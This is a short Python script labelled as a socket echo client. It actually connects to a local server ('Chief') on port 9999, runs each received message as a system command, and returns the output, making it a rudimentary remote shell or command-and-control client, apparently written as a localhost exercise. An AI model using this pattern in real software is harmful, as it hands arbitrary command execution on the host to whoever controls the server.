
#socket_echo_client_explicit.py

import socket
import sys
import subprocess


# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port on the server
# given by the caller
server_address = ('127.0.0.1', 9999)
print('connecting to {} port {}'.format(*server_address))
sock.connect(server_address)

try:

    message = b'BBBBB is the message.  It will be repeated.'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)
    while True:
        #receiving Data from Chief
        data = sock.recv(1024)
        print('received {!r}'.format(data.decode()))
        #print(type(data))
        
        #sending ack to Chief of receiving message
        response = "received message"
        sock.sendall(response.encode())
        
        #process message into cmd command
        command = data.decode()
        if command:
            #cmdResult = subprocess.run(command, shell=True, check=True)
            cmdResult = subprocess.check_output(command) # result is in bytes
            print(cmdResult)
            input("PAUSE")
            sock.sendall(cmdResult)
        else:
            break
        
        
        
finally:
    sock.close()

